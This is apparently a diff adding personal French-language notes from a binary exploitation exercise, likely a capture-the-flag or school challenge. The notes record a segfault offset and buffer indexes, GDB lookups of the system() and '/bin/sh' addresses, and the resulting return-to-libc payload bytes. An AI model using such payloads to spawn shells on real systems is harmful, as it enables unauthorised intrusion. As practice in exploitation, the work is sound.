@@ -1,0 +1,24 @@
+
+
+segfault a partir de 679 en index
+688 pour GDB
+
+
+
+index 101 = buffer command (command et local_28) 1684104562 en decimal
+
+dans gdb :
+p system = 0xf7e6aed0
+
+
+info proc map = 
+start addr : 0xf7e2c000
+end addr : 0xf7fd0000
+
+find start_addr, end_addr, "/bin/sh" = 0xf7f897ec
+
+
+\xd0\xae\xe6\xf7 + 4 padding + \xec\x97\xf8\xf7
+
+
+index 121 = surement adresse de return FFFFD7CC hexa et en decimal = 4294957004
